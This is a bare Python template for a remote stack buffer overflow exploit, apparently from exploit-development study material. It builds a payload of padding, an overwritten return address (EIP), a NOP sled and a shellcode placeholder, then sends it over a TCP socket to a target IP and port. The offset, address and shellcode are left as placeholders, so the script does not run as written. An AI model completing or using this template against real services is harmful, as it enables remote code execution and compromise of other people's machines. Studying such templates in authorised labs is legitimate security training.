#!/usr/bin/python

import socket

shellcode = #Place your shellcode here
buff = "A" * (Offset Value)
buff += #Address of EIP 
buff += "\x90" * (8/10/12/16/20...) 
buff += shellcode
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send(buff + "\r\n")
s.close()
